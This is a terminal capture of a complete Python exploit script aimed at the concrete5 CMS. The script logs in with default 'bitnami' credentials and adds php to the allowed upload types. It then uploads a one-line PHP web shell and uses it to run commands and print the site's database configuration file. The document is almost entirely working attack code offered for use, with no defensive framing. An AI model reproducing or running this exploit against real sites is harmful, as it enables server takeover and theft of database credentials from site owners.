c@kali:~/src/napalm2.2/modules$ cat shell-concrete5.py
#!/usr/bin/env python
# shell-concrete5.py - module based on previous version
#   created 29.04.2017. Bug ('feature') is exploitable only
#   when you will have a valid credentials.
import sys
import re
import requests

target = raw_input("[+] Hostname> ")
logMe = target + '/index.php/login'
session = requests.session()

initreq = session.get(logMe)
initresp = initreq.text

gettoken = re.compile('<input type="hidden" name="ccm_token" value="(.*?)"/>')
found = re.search(gettoken, initresp)

if found:
  token = found.group(1)
  print '[+] Found token: ' + str(token)


  # assuming token is valid, let's log in
  login_data = {
        'uName':'user',
        'uPassword':'bitnami',
        'ccm_token':token
  }
  loglink = target + '/index.php/login/authenticate/concrete'
  loginreq = session.post(loglink, data=login_data)

  #afterlogin = target + '/index.php/dashboard/system'
  afterlogin = target + '/index.php/dashboard/system/files/filetypes'
  nextreq1 = session.get(afterlogin)
  nextresp1 = nextreq1.text
  print '[+] Cool, we\'re logged-in!'
  #print afterlogin
  #print nextresp1
  print '[+] We are ready to go, extension-page is available.'
  print ''

  # construct POST with new.ext
  newToken = re.compile('<input type="hidden" name="ccm_token" value="(.*?)"/>')
  foundToken = re.search(newToken, nextresp1)

  if foundToken:
    newOne = foundToken.group(1)
    print '[+] New token grabbed: ' + str(newOne)

    data_ext = {
        'ccm_token':newOne,
        'file-access-file-types':'mov,asp,html,yyyy,zzzz,php,newone'
    }
    datalink = target + '/index.php/dashboard/system/files/filetypes/file_access_extensions'
    datareq = session.post(datalink, data=data_ext)
    dataresp = datareq.text
    nowwecan = re.compile('file-access-file-types" class="form-control" rows="3">(.*?)</textarea>')
    newexts = re.search(nowwecan, dataresp)

    if newexts:
      print '[+] Available now: '+  newexts.group(1)

      print '[+] Time to upload shell...'

      # next token to upload request
      nextTokenUrl = target + '/index.php/tools/required/files/import?currentFolder=0'
      tokreq3 = session.get(nextTokenUrl)
      tokresp3 = tokreq3.text

      grabNextTok = re.compile('input type="hidden" name="ccm_token" value="(.*?)"/>')
      foundit = re.search(grabNextTok, tokresp3)

      if foundit:
        tokentoup = foundit.group(1)
        print '[+] Next token (3rd): ' + str( tokentoup )

      # we are logged-in; preparing req to upload shell
      saymyname = 'meshell3.php'

      fp = open(saymyname,'w')
      fp.write('<?php system($_GET["xx"]);')
      fp.close()

      # tmpshfile ready, do req now
      up_files = { 'file':open(saymyname,'rb') }

      up_params = {
          'ccm_token':tokentoup,
          'filename':saymyname,
          'currentFolder':'0'
      }
      upreqlink = target + '/index.php/ccm/system/file/upload'
      upreqnow = session.post(upreqlink, files=up_files, data=up_params)
      upresp = upreqnow.text
      if saymyname in upresp:
        print '[+] Shell properly uploaded. Time to find it ('+str(saymyname)+')'

        searchme = target + '/index.php/dashboard/files/search'
        dosearch = session.get(searchme)
        meresp = dosearch.text

        searchShLink = re.compile(saymyname+'","urlInline":"http:(.*?)download_file(.*?)view_inline(.*?)","urlDownload":')
        foundShLink = re.search(searchShLink, meresp)

        if foundShLink:
          foundId = foundShLink.group(3)
          shid = foundId.strip('\/')
          print '[+] Found link ID:' + str(shid)

          preparingProp = target + '/index.php/ccm/system/dialogs/file/properties?fID='+str(shid)
          prepreq = session.get(preparingProp)
          prepresp = prepreq.text
          whereareutxt = '<a target="_blank" href="(.*?)/application/files/(.*?)' + saymyname +'">'
          whereareu = re.compile(whereareutxt)
          foundme2 = re.search(whereareu, prepresp)

          if foundme2:
            print '[+] Shell is ready to use:'
            shellshere =  target + '/application/files/' + foundme2.group(2) + '/'+saymyname + '?xx=id;cat ../../../../config/database.php'#id'
            print '       ' + shellshere

            print '[+] "Finish him!" ;7'
            finish = session.get(shellshere)
            fintxt = finish.text
            print '[+] Response:'
            print fintxt
            print '\n---------------'

      else:
        print  '[-] I can not upload our shell. Verify!'


